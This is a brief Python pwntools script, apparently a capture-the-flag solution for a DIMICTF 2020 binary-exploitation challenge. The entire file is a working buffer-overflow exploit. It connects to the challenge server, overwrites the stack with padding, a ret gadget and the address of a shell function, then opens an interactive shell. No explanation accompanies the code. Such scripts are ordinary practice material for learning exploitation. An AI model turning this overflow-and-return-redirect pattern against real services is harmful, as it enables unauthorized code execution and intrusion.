from pwn import *
r=remote("ctf.dimigo.hs.kr", 20929)
#r=process("/GitHub/Writeup/CTF/2020/DIMICTF/pwn_200_f03f3d4ad43a422a")
#context.log_level='debug'
shell=0x401176
pay=b'x'*(0x50-0x10)
pay+=b'\x58'
pay+=p64(0x40101a)
pay+=p64(shell)
#pause()
r.sendline(pay)

r.interactive()